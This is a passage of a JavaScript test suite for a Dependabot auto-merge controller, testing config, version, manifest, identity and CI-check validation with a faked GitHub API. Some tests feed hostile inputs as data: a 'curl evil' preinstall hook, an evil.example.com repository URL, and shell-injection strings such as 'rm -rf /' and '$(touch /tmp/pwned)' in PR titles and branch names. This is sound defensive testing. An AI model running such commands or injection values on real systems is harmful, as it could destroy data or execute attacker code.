'use strict';

/**
 * Offline tests for the trusted Dependabot auto-merge controller
 * (.github/scripts/dependabot-automerge.cjs).
 *
 * All GitHub API access is faked; no test performs network requests, merges,
 * comments or any other write. Fixtures are test data, NOT evidence of real
 * API behaviour. The workflow-file assertions are a static analysis of the
 * trusted YAML; they do not validate GitHub execution semantics — that is
 * actionlint plus review (see TECHNICAL-PLAN 8B).
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const controller = require('../../.github/scripts/dependabot-automerge.cjs');
const pure = controller.__pure;

const REPO_ROOT = path.resolve(__dirname, '..', '..');
const REPO_ID = 1284294352;
const RUN_ID = 4242;
const SUITE_ID = 999;
const HEAD = `a${'0'.repeat(39)}`;
const BASE = `b${'0'.repeat(39)}`;
const MERGEBASE = `c${'0'.repeat(39)}`;
const MAIN = `8ab2ecf5b09954d741d36fdfc3b1b22771158649`;
const CONTROLLER_SHA = `d${'0'.repeat(39)}`;
const OTHER_SHA = `f${'0'.repeat(39)}`;
const MERGE_SHA = `9${'0'.repeat(39)}`;

/* ---------------------------------------------------------------------- */
/* Fixtures                                                                */
/* ---------------------------------------------------------------------- */

function makeRun(overrides = {}) {
	return {
		id: RUN_ID,
		run_attempt: 1,
		workflow_id: 305123310,
		name: 'Test and Release',
		path: '.github/workflows/test-and-release.yml',
		event: 'pull_request',
		status: 'completed',
		conclusion: 'success',
		head_sha: HEAD,
		repository: { id: REPO_ID },
		check_suite_id: SUITE_ID,
		...overrides,
	};
}

function makePr(overrides = {}) {
	return {
		number: 188,
		state: 'open',
		draft: false,
		merged: false,
		mergeable: true,
		mergeable_state: 'clean',
		changed_files: 2,
		title: 'chore(deps-dev): bump test fixture',
		base: { ref: 'main', sha: BASE, repo: { id: REPO_ID } },
		head: { sha: HEAD, ref: 'dependabot/npm_and_yarn/fixture-22.20.6', repo: { id: REPO_ID } },
		user: { login: 'dependabot[bot]', id: 49699333, type: 'Bot' },
		merge_commit_sha: null,
		...overrides,
	};
}

function makeCommit(overrides = {}) {
	return {
		sha: `e${'0'.repeat(39)}`,
		author: { id: 49699333, login: 'dependabot[bot]', type: 'Bot' },
		commit: { verification: { verified: true } },
		...overrides,
	};
}

const JOBS = [
	{ name: 'check-and-lint', status: 'completed', conclusion: 'success' },
	{ name: 'adapter-tests (22.x, ubuntu-latest)', status: 'completed', conclusion: 'success' },
	{ name: 'adapter-tests (24.x, ubuntu-latest)', status: 'completed', conclusion: 'success' },
	{ name: 'adapter-tests (26.x, ubuntu-latest)', status: 'completed', conclusion: 'success' },
	{ name: 'adapter-tests (22.x, windows-latest)', status: 'completed', conclusion: 'success' },
	{ name: 'adapter-tests (24.x, macos-latest)', status: 'completed', conclusion: 'success' },
];

function makeCheckRuns(overrides = {}) {
	return controller.EXPECTED.REQUIRED_CHECKS.map(name => ({
		name,
		head_sha: HEAD,
		status: 'completed',
		conclusion: 'success',
		app: { id: 15368 },
		check_suite: { id: SUITE_ID },
		...(overrides[name] || {}),
	}));
}

const FILES = [
	{ filename: 'package.json', status: 'modified' },
	{ filename: 'package-lock.json', status: 'modified' },
];

const BASE_MANIFEST = {
	name: 'iobroker.bluetti',
	version: '1.0.2',
	main: 'build/main.js',
	scripts: { test: 'npm run test' },
	dependencies: { '@iobroker/adapter-core': '^3.4.3' },
	devDependencies: {
		'@types/node': '^22.20.5',
		'@types/iobroker': 'npm:@iobroker/types@^7.2.2',
	},
};

const HEAD_MANIFEST = {
	...BASE_MANIFEST,
	devDependencies: {
		...BASE_MANIFEST.devDependencies,
		'@types/node': '^22.20.6', // dev patch
	},
};

const LOCKFILE = {
	lockfileVersion: 3,
	packages: {
		'': { name: 'iobroker.bluetti', version: '1.0.2' },
	},
};

const CONFIG_TEMPLATE = {
	schemaVersion: 1,
	enabled: false,
	mergeMethod: 'squash',
	npm: { production: ['patch'], development: ['patch', 'minor'] },
};

function writeConfig(enabled, template = CONFIG_TEMPLATE) {
	const file = path.join(
		os.tmpdir(),
		`bluetti-auto-merge-test-${process.pid}-${Math.random().toString(36).slice(2)}.json`,
	);
	fs.writeFileSync(file, JSON.stringify({ ...template, enabled }));
	return file;
}

function makeContext(overrides = {}, runOverrides = {}) {
	return {
		eventName: 'workflow_run',
		payload: {
			action: 'completed',
			repository: { id: REPO_ID, full_name: 'Percy2Live/ioBroker.bluetti' },
			workflow_run: {
				id: RUN_ID,
				run_attempt: 1,
				head_sha: HEAD,
				name: 'Test and Release',
				event: 'pull_request',
				conclusion: 'success',
				pull_requests: [], // real workflow_run payloads are often empty
				...runOverrides,
			},
		},
		sha: CONTROLLER_SHA,
		...overrides,
	};
}

function makeCore() {
	const info = [];
	const failures = [];
	const summaries = [];
	return {
		info: message => info.push(message),
		setFailed: message => failures.push(message),
		summary: {
			addRaw: text => summaries.push(text),
			write: () => {},
		},
		__info: info,
		__failures: failures,
		__summaries: summaries,
	};
}

/**
 * Fake GitHub client. Values in the scenario may be functions of the call
 * count to simulate drift between fetches. The fake honours pagination by
 * cutting lists into pages of `pageSize` items; a page smaller than requested
 * terminates controller pagination.
 *
 * @param {object} scenario - route handlers and values; functions simulate drift per call
 */
function makeFakeGithub(scenario = {}) {
	const writes = [];
	const readCounts = {};
	function next(key, fallback) {
		const value = scenario[key] === undefined ? fallback : scenario[key];
		const count = readCounts[key] || 0;
		readCounts[key] = count + 1;
		return typeof value === 'function' ? value(count) : value;
	}
	function page(route, items) {
		const size = scenario.pageSize || 100;
		const state = scenario.__pages || (scenario.__pages = {});
		const current = state[route] || 1;
		state[route] = current + 1;
		return items.slice((current - 1) * size, current * size);
	}
	function fileBody(entry) {
		if (entry && typeof entry === 'object' && Object.prototype.hasOwnProperty.call(entry, 'raw')) {
			return {
				type: 'file',
				encoding: 'base64',
				size: entry.size === undefined ? Buffer.byteLength(entry.raw) : entry.size,
				content: Buffer.from(entry.raw).toString('base64'),
			};
		}
		return {
			type: 'file',
			encoding: 'base64',
			size: Buffer.byteLength(JSON.stringify(entry)),
			content: Buffer.from(JSON.stringify(entry)).toString('base64'),
		};
	}
	const github = {
		async request(route, params) {
			if (route === 'GET /repos/{owner}/{repo}/actions/runs/{run_id}') {
				return { status: 200, data: next('run', makeRun()), headers: {} };
			}
			if (route === 'GET /repos/{owner}/{repo}/pulls') {
				return { status: 200, data: page('pulls', next('openPrs', [makePr()])), headers: {} };
			}
			if (route === 'GET /repos/{owner}/{repo}/pulls/{pull_number}') {
				return { status: 200, data: next('pr', makePr()), headers: {} };
			}
			if (route === 'GET /repos/{owner}/{repo}/pulls/{pull_number}/commits') {
				return { status: 200, data: page('commits', next('commits', [makeCommit()])), headers: {} };
			}
			if (route === 'GET /repos/{owner}/{repo}/pulls/{pull_number}/files') {
				return { status: 200, data: page('files', next('files', FILES)), headers: {} };
			}
			if (route === 'GET /repos/{owner}/{repo}/compare/{basehead}') {
				return { status: 200, data: next('compare', { merge_base_commit: { sha: MERGEBASE } }), headers: {} };
			}
			if (route === 'GET /repos/{owner}/{repo}/git/ref/{ref}') {
				return { status: 200, data: next('mainRef', { object: { sha: MAIN } }), headers: {} };
			}
			if (route === 'GET /repos/{owner}/{repo}/contents/{path}') {
				const key = `${params.path}@${params.ref}`;
				const entry = (scenario.fileContents || {})[key];
				if (entry === undefined) {
					const error = new Error(`fake: no content for ${key}`);
					error.status = 404;
					throw error;
				}
				return { status: 200, data: fileBody(entry), headers: {} };
			}
			if (route === 'GET /repos/{owner}/{repo}/actions/runs/{run_id}/attempts/{attempt_number}/jobs') {
				return { status: 200, data: { jobs: page('jobs', next('jobs', JOBS)) }, headers: {} };
			}
			if (route === 'GET /repos/{owner}/{repo}/commits/{ref}/check-runs') {
				return {
					status: 200,
					data: { check_runs: page('check-runs', next('checkRuns', makeCheckRuns())) },
					headers: {},
				};
			}
			if (route === 'PUT /repos/{owner}/{repo}/pulls/{pull_number}/merge') {
				writes.push({ route, params });
				const response = next('mergeResponse', { merged: true, sha: MERGE_SHA });
				if (response instanceof Error) {
					throw response;
				}
				return { status: 200, data: response, headers: {} };
			}
			throw new Error(`fake: unexpected route ${route}`);
		},
	};
	github.__writes = writes;
	return github;
}

function defaultFiles() {
	return {
		[`package.json@${MERGEBASE}`]: BASE_MANIFEST,
		[`package.json@${HEAD}`]: HEAD_MANIFEST,
		[`package-lock.json@${HEAD}`]: LOCKFILE,
	};
}

async function runScenario({
	scenario = {},
	enabled = false,
	context = {},
	run = {},
	configTemplate = CONFIG_TEMPLATE,
	configPath = null,
} = {}) {
	const github = makeFakeGithub(scenario);
	const core = makeCore();
	const ctx = makeContext(context, run);
	const effectiveConfigPath = configPath || writeConfig(enabled, configTemplate);
	try {
		const result = await controller.run({ github, context: ctx, core }, { configPath: effectiveConfigPath });
		return { result, writes: github.__writes, core, github };
	} finally {
		if (configPath === null) {
			fs.rmSync(effectiveConfigPath, { force: true });
		}
	}
}

function openThenMergedPr() {
	return count => {
		if (count <= 1) {
			return makePr();
		}
		return makePr({ state: 'closed', merged: true, merge_commit_sha: MERGE_SHA });
	};
}

/* ---------------------------------------------------------------------- */
/* Unit tests: configuration schema                                        */
/* ---------------------------------------------------------------------- */

test('config: accepts the exact bootstrap schema and rejects drift', () => {
	assert.equal(pure.validateConfig(CONFIG_TEMPLATE).ok, true);
	assert.equal(pure.validateConfig({ ...CONFIG_TEMPLATE, enabled: true }).ok, true);
	assert.equal(pure.validateConfig({ ...CONFIG_TEMPLATE, extra: 1 }).ok, false);
	assert.equal(pure.validateConfig({ ...CONFIG_TEMPLATE, schemaVersion: 2 }).ok, false);
	assert.equal(pure.validateConfig({ ...CONFIG_TEMPLATE, enabled: 'false' }).ok, false);
	assert.equal(pure.validateConfig({ ...CONFIG_TEMPLATE, mergeMethod: 'merge' }).ok, false);
	assert.equal(pure.validateConfig({ ...CONFIG_TEMPLATE, npm: { production: ['minor'] } }).ok, false);
	assert.equal(pure.validateConfig({ ...CONFIG_TEMPLATE, npm: { development: ['major'] } }).ok, false);
	assert.equal(
		pure.validateConfig({
			...CONFIG_TEMPLATE,
			npm: { production: ['patch'], development: ['patch', 'minor'], extra: true },
		}).ok,
		false,
	);
	assert.equal(pure.validateConfig(null).ok, false);
	assert.equal(pure.validateConfig('[]').ok, false);
});

test('config: enabled=false means audit mode in the shipped configuration', () => {
	const shipped = JSON.parse(fs.readFileSync(path.join(REPO_ROOT, '.github', 'auto-merge.json'), 'utf8'));
	assert.deepEqual(shipped, CONFIG_TEMPLATE);
});

/* ---------------------------------------------------------------------- */
/* Unit tests: version parsing and classification                          */
/* ---------------------------------------------------------------------- */

test('version spec: accepts canonical stable specs with ^ or ~ prefix', () => {
	for (const spec of ['1.2.3', '^1.2.3', '~0.4.7', '22.20.6', '^999999999.9.9']) {
		const parsed = pure.parseVersionSpec(spec);
		assert.equal(parsed.ok, true, spec);
	}
});

test('version spec: rejects everything non-canonical', () => {
	const rejected = [
		'1.2.3-beta.1',
		'1.2.3+build',
		'01.2.3',
		'1.02.3',
		'1.2.03',
		'1.2',
		'1.2.3.4',
		'>=1.0.0',
		'^1.x',
		'*',
		'latest',
		'workspace:*',
		'npm:@iobroker/types@^7.2.2',
		'https://example.com/x.tgz',
		'1.2.3 || >=2.0.0',
		'',
		'1234567890.1.1',
		'1.2.3 ',
	];
	for (const spec of rejected) {
		assert.equal(pure.parseVersionSpec(spec).ok, false, spec);
	}
	assert.equal(pure.parseVersionSpec(42).ok, false);
	assert.equal(pure.parseVersionSpec(null).ok, false);
});

test('version compare: bump types, downgrades and BigInt precision', () => {
	const oldV = pure.parseVersionSpec('^1.2.3');
	assert.equal(pure.bumpType(oldV, pure.parseVersionSpec('^1.2.4')), 'patch');
	assert.equal(pure.bumpType(oldV, pure.parseVersionSpec('^1.3.0')), 'minor');
	assert.equal(pure.bumpType(oldV, pure.parseVersionSpec('^2.0.0')), 'major');
	assert.equal(pure.compareParsedVersions(oldV, pure.parseVersionSpec('^1.2.2')), -1);
	assert.equal(pure.compareParsedVersions(oldV, pure.parseVersionSpec('^1.2.3')), 0);
	const bigLow = pure.parseVersionSpec('^999999999.0.0');
	const bigHigh = pure.parseVersionSpec('^999999999.999999999.999999999');
	assert.equal(pure.compareParsedVersions(bigLow, bigHigh), 1);
	assert.equal(pure.compareParsedVersions(bigHigh, bigLow), -1);
	// Numbers that would lose float precision are rejected outright.
	assert.equal(pure.parseVersionSpec('9999999999999999999.1.1').ok, false);
});

test('dependency classification: policy gates', () => {
	const policy = pure.validateConfig(CONFIG_TEMPLATE).config;
	assert.equal(pure.classifyDependencyChange('production', '^3.4.3', '^3.4.4', policy).ok, true);
	assert.equal(pure.classifyDependencyChange('production', '^3.4.3', '^3.5.0', policy).ok, false);
	assert.equal(pure.classifyDependencyChange('production', '^3.4.3', '^4.0.0', policy).ok, false);
	assert.equal(pure.classifyDependencyChange('development', '^22.20.5', '^22.20.6', policy).ok, true);
	assert.equal(pure.classifyDependencyChange('development', '^22.20.5', '^22.21.0', policy).ok, true);
	assert.equal(pure.classifyDependencyChange('development', '^22.20.5', '^23.0.0', policy).ok, false);
	assert.equal(pure.classifyDependencyChange('development', '^22.20.5', '^22.20.4', policy).ok, false);
	assert.equal(pure.classifyDependencyChange('development', '~22.20.5', '^22.20.6', policy).ok, false);
	assert.equal(pure.classifyDependencyChange('development', '^22.20.5', '22.21.0', policy).ok, false);
	assert.equal(pure.classifyDependencyChange('development', '^22.20.5', '^22.20.5', policy).ok, false);
});

/* ---------------------------------------------------------------------- */
/* Unit tests: manifest / lockfile / file list                             */
/* ---------------------------------------------------------------------- */

function policyConfig() {
	return pure.validateConfig(CONFIG_TEMPLATE).config;
}

test('manifest diff: allowed updates pass, everything else fails', () => {
	const policy = policyConfig();
	const bump = (section, name, version) => {
		const base = JSON.parse(JSON.stringify(BASE_MANIFEST));
		const head = JSON.parse(JSON.stringify(BASE_MANIFEST));
		head[section][name] = version;
		return pure.validateManifestDiff(base, head, policy);
	};
	assert.equal(bump('devDependencies', '@types/node', '^22.20.6').ok, true);
	assert.equal(bump('devDependencies', '@types/node', '^22.21.0').ok, true);
	assert.equal(bump('devDependencies', '@types/node', '^22.20.4').ok, false);
	assert.equal(bump('devDependencies', '@types/node', '^23.0.0').ok, false);
	assert.equal(bump('dependencies', '@iobroker/adapter-core', '^3.4.4').ok, true);
	assert.equal(bump('dependencies', '@iobroker/adapter-core', '^3.5.0').ok, false);
	assert.equal(bump('dependencies', '@iobroker/adapter-core', '^4.0.0').ok, false);
	assert.equal(bump('devDependencies', '@types/node', '^22.20.6-beta.1').ok, false);
});

test('manifest diff: structural changes outside dependencies are rejected', () => {
	const policy = policyConfig();
	const changed = mutate => {
		const base = JSON.parse(JSON.stringify(BASE_MANIFEST));
		const head = JSON.parse(JSON.stringify(BASE_MANIFEST));
		head.devDependencies['@types/node'] = '^22.20.6';
		mutate(head);
		return pure.validateManifestDiff(base, head, policy);
	};
	assert.equal(
		changed(m => {
			m.version = '1.0.3';
		}).ok,
		false,
	);
	assert.equal(
		changed(m => {
			m.scripts.preinstall = 'curl evil';
		}).ok,
		false,
	);
	assert.equal(
		changed(m => {
			m.overrides = { diff: '^9.0.0' };
		}).ok,
		false,
	);
	assert.equal(
		changed(m => {
			m.repository = { type: 'git', url: 'git+https://evil.example.com/x.git' };
		}).ok,
		false,
	);
	assert.equal(
		changed(m => {
			m.newField = 'x';
		}).ok,
		false,
	);
	assert.equal(
		changed(m => {
			delete m.main;
		}).ok,
		false,
	);
});

test('manifest diff: key set and section assignment must be stable', () => {
	const policy = policyConfig();
	assert.equal(
		pure.validateManifestDiff(
			BASE_MANIFEST,
			{ ...BASE_MANIFEST, dependencies: { ...BASE_MANIFEST.dependencies, 'left-pad': '^1.0.0' } },
			policy,
		).ok,
		false,
	);
	assert.equal(pure.validateManifestDiff(BASE_MANIFEST, { ...BASE_MANIFEST, dependencies: {} }, policy).ok, false);
	// A dependency moved from production to development between base and head.
	const moved = JSON.parse(JSON.stringify(HEAD_MANIFEST));
	delete moved.dependencies['@iobroker/adapter-core'];
	moved.devDependencies['@iobroker/adapter-core'] = '^3.4.3';
	assert.equal(pure.validateManifestDiff(BASE_MANIFEST, moved, policy).ok, false);
});

test('manifest diff: unchanged alias dependency does not block an allowed update', () => {
	const policy = policyConfig();
	assert.equal(pure.validateManifestDiff(BASE_MANIFEST, HEAD_MANIFEST, policy).ok, true);
	const result = pure.validateManifestDiff(BASE_MANIFEST, HEAD_MANIFEST, policy);
	assert.equal(result.changes.length, 1);
	assert.equal(result.changes[0].name, '@types/node');
	assert.equal(result.changes[0].type, 'patch');
});

test('manifest diff: changed alias dependency is rejected', () => {
	const policy = policyConfig();
	const head = JSON.parse(JSON.stringify(BASE_MANIFEST));
	head.devDependencies['@types/iobroker'] = 'npm:@iobroker/types@^7.3.0';
	assert.equal(pure.validateManifestDiff(BASE_MANIFEST, head, policy).ok, false);
});

test('manifest diff: no dependency change at all is not a merge candidate', () => {
	assert.equal(pure.validateManifestDiff(BASE_MANIFEST, BASE_MANIFEST, policyConfig()).ok, false);
});

test('manifest diff: key order does not matter', () => {
	const policy = policyConfig();
	const reorderedHead = {
		devDependencies: { '@types/iobroker': 'npm:@iobroker/types@^7.2.2', '@types/node': '^22.20.6' },
		dependencies: { '@iobroker/adapter-core': '^3.4.3' },
		scripts: { test: 'npm run test' },
		main: 'build/main.js',
		version: '1.0.2',
		name: 'iobroker.bluetti',
	};
	assert.equal(pure.validateManifestDiff(BASE_MANIFEST, reorderedHead, policy).ok, true);
});

test('lockfile: root metadata must match the manifest', () => {
	assert.equal(pure.validateLockfile(LOCKFILE, HEAD_MANIFEST).ok, true);
	assert.equal(pure.validateLockfile({ ...LOCKFILE, lockfileVersion: 2 }, HEAD_MANIFEST).ok, true);
	assert.equal(pure.validateLockfile({ ...LOCKFILE, lockfileVersion: 1 }, HEAD_MANIFEST).ok, false);
	assert.equal(
		pure.validateLockfile({ ...LOCKFILE, packages: { '': { name: 'evil', version: '1.0.2' } } }, HEAD_MANIFEST).ok,
		false,
	);
	assert.equal(
		pure.validateLockfile(
			{ ...LOCKFILE, packages: { '': { name: 'iobroker.bluetti', version: '9.9.9' } } },
			HEAD_MANIFEST,
		).ok,
		false,
	);
	assert.equal(pure.validateLockfile({ ...LOCKFILE, packages: {} }, HEAD_MANIFEST).ok, false);
	assert.equal(pure.validateLockfile(null, HEAD_MANIFEST).ok, false);
});

test('file list: only modified root package.json and package-lock.json', () => {
	assert.equal(pure.validateFileList(FILES, 2).ok, true);
	assert.equal(
		pure.validateFileList([{ filename: 'package.json', status: 'modified' }], 1).ok,
		false,
		'lockfile missing',
	);
	assert.equal(
		pure.validateFileList([{ filename: 'package-lock.json', status: 'modified' }], 1).ok,
		false,
		'lockfile-only is unsupported',
	);
	assert.equal(pure.validateFileList(FILES, 3).ok, false, 'count mismatch');
	assert.equal(
		pure.validateFileList([...FILES, { filename: '.github/workflows/test-and-release.yml', status: 'modified' }], 3)
			.ok,
		false,
		'workflow path',
	);
	assert.equal(
		pure.validateFileList([...FILES, { filename: 'src/main.ts', status: 'added' }], 3).ok,
		false,
		'added file',
	);
	assert.equal(
		pure.validateFileList(
			[
				{ filename: 'package.json', status: 'added' },
				{ filename: 'package-lock.json', status: 'modified' },
			],
			2,
		).ok,
		false,
		'added status',
	);
	assert.equal(
		pure.validateFileList(
			[
				{ filename: 'package.json', status: 'renamed' },
				{ filename: 'package-lock.json', status: 'modified' },
			],
			2,
		).ok,
		false,
		'renamed status',
	);
	assert.equal(
		pure.validateFileList(
			[
				{ filename: 'package.json', status: 'removed' },
				{ filename: 'package-lock.json', status: 'modified' },
			],
			2,
		).ok,
		false,
		'removed status',
	);
	assert.equal(pure.validateFileList('nope', 2).ok, false);
});

/* ---------------------------------------------------------------------- */
/* Unit tests: run, identity and check validation                          */
/* ---------------------------------------------------------------------- */

test('trigger run: every identity attribute is enforced', () => {
	assert.equal(pure.validateTriggerRun(makeRun()).ok, true);
	assert.equal(pure.validateTriggerRun(makeRun({ repository: { id: 42 } })).ok, false);
	assert.equal(pure.validateTriggerRun(makeRun({ workflow_id: 111 })).ok, false);
	assert.equal(pure.validateTriggerRun(makeRun({ name: 'Other' })).ok, false);
	assert.equal(pure.validateTriggerRun(makeRun({ path: '.github/workflows/other.yml' })).ok, false);
	assert.equal(pure.validateTriggerRun(makeRun({ event: 'push' })).ok, false);
	assert.equal(pure.validateTriggerRun(makeRun({ event: 'dynamic' })).ok, false);
	assert.equal(pure.validateTriggerRun(makeRun({ status: 'in_progress' })).ok, false);
	assert.equal(pure.validateTriggerRun(makeRun({ conclusion: 'failure' })).ok, false);
	assert.equal(pure.validateTriggerRun(makeRun({ conclusion: 'cancelled' })).ok, false);
	assert.equal(pure.validateTriggerRun(makeRun({ conclusion: 'neutral' })).ok, false);
	assert.equal(pure.validateTriggerRun(makeRun({ conclusion: 'skipped' })).ok, false);
	assert.equal(pure.validateTriggerRun(makeRun({ head_sha: 'short' })).ok, false);
	assert.equal(pure.validateTriggerRun(makeRun({ run_attempt: '1' })).ok, false);
	assert.equal(pure.validateTriggerRun(null).ok, false);
});

test('pr identity: dependabot profile must match exactly', () => {
	assert.equal(pure.validatePrIdentity(makePr().user).ok, false, 'identity is validated on the full PR object');
	const pr = makePr();
	assert.equal(pure.validatePrIdentity(pr).ok, true);
	assert.equal(pure.validatePrIdentity(makePr({ user: { login: 'dependabot[bot]', id: 1, type: 'Bot' } })).ok, false);
	assert.equal(
		pure.validatePrIdentity(makePr({ user: { login: 'Dependabot[bot]', id: 49699333, type: 'Bot' } })).ok,
		false,
	);
	assert.equal(
		pure.validatePrIdentity(makePr({ user: { login: 'dependabot[bot]', id: 49699333, type: 'User' } })).ok,
		false,
	);
	assert.equal(
		pure.validatePrIdentity(makePr({ user: { login: 'ioBroker-Bot', id: 156702024, type: 'User' } })).ok,
		false,
	);
	assert.equal(pure.validatePrIdentity(makePr({ user: null })).ok, false);
	assert.equal(pure.validatePrIdentity(null).ok, false);
});

test('checks: all three required checks must be present and successful', () => {
	assert.equal(pure.validateChecks(JOBS, makeCheckRuns(), SUITE_ID, HEAD).ok, true);
	const missing = JOBS.filter(job => job.name !== 'check-and-lint');
	assert.equal(pure.validateChecks(missing, makeCheckRuns(), SUITE_ID, HEAD).ok, false);
	for (const state of [
		{ status: 'completed', conclusion: 'failure' },
		{ status: 'completed', conclusion: 'skipped' },
		{ status: 'completed', conclusion: 'neutral' },
		{ status: 'in_progress', conclusion: null },
		{ status: 'queued', conclusion: null },
	]) {
		const jobs = JOBS.map(job => (job.name === 'check-and-lint' ? { ...job, ...state } : job));
		assert.equal(pure.validateChecks(jobs, makeCheckRuns(), SUITE_ID, HEAD).ok, false, JSON.stringify(state));
	}
	const missingHead = makeCheckRuns().filter(run => run.name !== 'check-and-lint');
	assert.equal(pure.validateChecks(JOBS, missingHead, SUITE_ID, HEAD).ok, false);
	const failedHead = makeCheckRuns({ 'check-and-lint': { conclusion: 'failure' } });
	assert.equal(pure.validateChecks(JOBS, failedHead, SUITE_ID, HEAD).ok, false);
	const pendingHead = makeCheckRuns({
		'adapter-tests (22.x, ubuntu-latest)': { status: 'in_progress', conclusion: null },
	});
	assert.equal(pure.validateChecks(JOBS, pendingHead, SUITE_ID, HEAD).ok, false);
	const wrongApp = makeCheckRuns().map(run => ({ ...run, app: { id: 999 } }));
	assert.equal(pure.validateChecks(JOBS, wrongApp, SUITE_ID, HEAD).ok, false);
	const wrongSuite = makeCheckRuns({ 'check-and-lint': { check_suite: { id: 12345 } } });
	assert.equal(pure.validateChecks(JOBS, wrongSuite, SUITE_ID, HEAD).ok, false);
	const wrongHead = makeCheckRuns({ 'check-and-lint': { head_sha: OTHER_SHA } });
	assert.equal(pure.validateChecks(JOBS, wrongHead, SUITE_ID, HEAD).ok, false);
	const newerFailed = [
		...makeCheckRuns(),
		{
			name: 'check-and-lint',
			head_sha: HEAD,
			status: 'completed',
			conclusion: 'failure',
			app: { id: 15368 },
			check_suite: { id: 12345 },
		},
	];
	assert.equal(pure.validateChecks(JOBS, newerFailed, SUITE_ID, HEAD).ok, false);
	assert.equal(pure.validateChecks([], [], SUITE_ID, HEAD).ok, false, 'no checks is never success');
});

/* ---------------------------------------------------------------------- */
/* Orchestration: audit mode (enabled=false) performs zero writes          */
/* ---------------------------------------------------------------------- */

test('audit mode: fully eligible PR yields merge-decision with zero writes', async () => {
	const { result, writes, core } = await runScenario({ scenario: { fileContents: defaultFiles() }, enabled: false });
	assert.equal(result.result, 'merge-decision');
	assert.equal(writes.length, 0);
	const summary = core.__summaries.join('');
	assert.match(summary, /AUDIT MODE/);
	assert.match(summary, new RegExp(HEAD));
	assert.match(summary, /#188/);
	assert.match(summary, /check-and-lint=completed\/success/);
	assert.equal(core.__failures.length, 0);
});

test('audit mode: empty payload pull_requests array is not authoritative', async () => {
	const { result, writes } = await runScenario({
		scenario: { fileContents: defaultFiles() },
		enabled: false,
		run: { pull_requests: [] },
	});
	assert.equal(result.result, 'merge-decision');
	assert.equal(writes.length, 0);
});

test('audit mode: prod patch PR also reaches a merge-decision', async () => {
	const files = defaultFiles();
	files[`package.json@${HEAD}`] = { ...HEAD_MANIFEST, dependencies: { '@iobroker/adapter-core': '^3.4.4' } };
	const { result, writes } = await runScenario({ scenario: { fileContents: files }, enabled: false });
	assert.equal(result.result, 'merge-decision');
	assert.equal(writes.length, 0);
});

test('audit mode: audit summary never contains PR title or body', async () => {
	const malicious = makePr({ title: '"; rm -rf / # ${process.env}', body: '$(touch /tmp/pwned)' });
	const { result, writes, core } = await runScenario({
		scenario: { pr: malicious, openPrs: [malicious], fileContents: defaultFiles() },
		enabled: false,
	});
	assert.equal(result.result, 'merge-decision');
	assert.equal(writes.length, 0);
	const summary = core.__summaries.join('');
	assert.equal(summary.includes('rm -rf'), false);
	assert.equal(summary.includes('touch /tmp'), false);
});

test('audit mode: malicious branch names and labels are data only', async () => {
	const malicious = makePr({ head: { sha: HEAD, ref: '$(touch /tmp/pwned)', repo: { id: REPO_ID } } });
	const { result, writes } = await runScenario({
		scenario: { pr: malicious, openPrs: [malicious], fileContents: defaultFiles() },
		enabled: false,
	});
	assert.equal(result.result, 'merge-decision');
	assert.equal(writes.length, 0);
	assert.equal(fs.existsSync('/tmp/pwned'), false);
});

/* ---------------------------------------------------------------------- */
/* Orchestration: trigger and PR resolution                                */
/* ---------------------------------------------------------------------- */

const skipCases = {
	'non-workflow_run event': { context: { eventName: 'pull_request' } },
	'payload repository mismatch': {
		context: {
			payload: {
				action: 'completed',
				repository: { full_name: 'evil/evil' },
				workflow_run: { id: RUN_ID, run_attempt: 1, head_sha: HEAD },
			},
		},
	},
	'run for another workflow': {
		run: null,
		scenario: { run: makeRun({ workflow_id: 1, name: 'Other', path: '.github/workflows/other.yml' }) },
	},
	'run for a push event': { run: null, scenario: { run: makeRun({ event: 'push' }) } },
	'run for a dynamic dependabot workflow': { run: null, scenario: { run: makeRun({ event: 'dynamic' }) } },
	'failed run': { run: null, scenario: { run: makeRun({ conclusion: 'failure' }) } },
	'cancelled run': { run: null, scenario: { run: makeRun({ conclusion: 'cancelled' }) } },
	'stale attempt in payload': { run: null, scenario: { run: makeRun({ run_attempt: 2 }) } },
	'payload head drift': { run: { head_sha: OTHER_SHA } },
	'no matching open PR': { scenario: { openPrs: [] } },
	'fork head PR': { scenario: { openPrs: [makePr({ head: { sha: HEAD, repo: { id: 5555 } } })] } },
	'null head.repo PR': { scenario: { openPrs: [makePr({ head: { sha: HEAD, repo: null } })] } },
	'multiple candidates for the head': { scenario: { openPrs: [makePr(), makePr({ number: 189 })] } },
};

for (const [name, { context, run, scenario } = {}] of Object.entries(skipCases)) {
	test(`skip: ${name}`, async () => {
		const outcome = await runScenario({
			scenario: { fileContents: defaultFiles(), ...(scenario || {}) },
			enabled: false,
			context: context || {},
			run: run || {},
		});
		assert.equal(outcome.result.result, 'skip', outcome.result.reason);
		assert.equal(outcome.writes.length, 0);
	});
}

test('skip: run in another repository', async () => {
	const { result, writes } = await runScenario({
		scenario: { run: makeRun({ repository: { id: 4711 } }), fileContents: defaultFiles() },
		enabled: false,
	});
	assert.equal(result.result, 'skip');
	assert.equal(writes.length, 0);
});

test('pagination: candidate is found across multiple pages of open PRs', async () => {
	const filler = Array.from({ length: 100 }, (_, index) =>
		makePr({
			number: 1000 + index,
			head: { sha: `1${'0'.repeat(38)}${String(index).padStart(2, '0')}`.slice(0, 40), repo: { id: REPO_ID } },
		}),
	);
	const { result, writes } = await runScenario({
		scenario: { pageSize: 100, openPrs: [...filler, makePr()], fileContents: defaultFiles() },
		enabled: false,
	});
	assert.equal(result.result, 'merge-decision', result.reason);
	assert.equal(writes.length, 0);
});

test('pagination: required jobs are read across multiple pages', async () => {
	const fillerJobs = Array.from({ length: 99 }, (_, index) => ({
		name: `filler-job-${index}`,
		status: 'completed',
		conclusion: 'success',
	}));
	const { result } = await runScenario({
		scenario: { pageSize: 100, jobs: [...fillerJobs, ...JOBS], fileContents: defaultFiles() },
		enabled: false,
	});
	assert.equal(result.result, 'merge-decision', result.reason);
});

/* ---------------------------------------------------------------------- */
/* Orchestration: PR state, identity and commits                           */
/* ---------------------------------------------------------------------- */

for (const [name, prState] of Object.entries({
	'closed PR': { state: 'closed', merged: false },
	'already merged PR (idempotent)': { state: 'closed', merged: true, merge_commit_sha: MERGE_SHA },
	'draft PR': { draft: true },
	'mergeable null': { mergeable: null, mergeable_state: 'unknown' },
	'mergeable dirty': { mergeable: false, mergeable_state: 'dirty' },
	'mergeable blocked': { mergeable: true, mergeable_state: 'blocked' },
})) {
	test(`skip: ${name}`, async () => {
		const pr = makePr(prState);
		const { result, writes } = await runScenario({
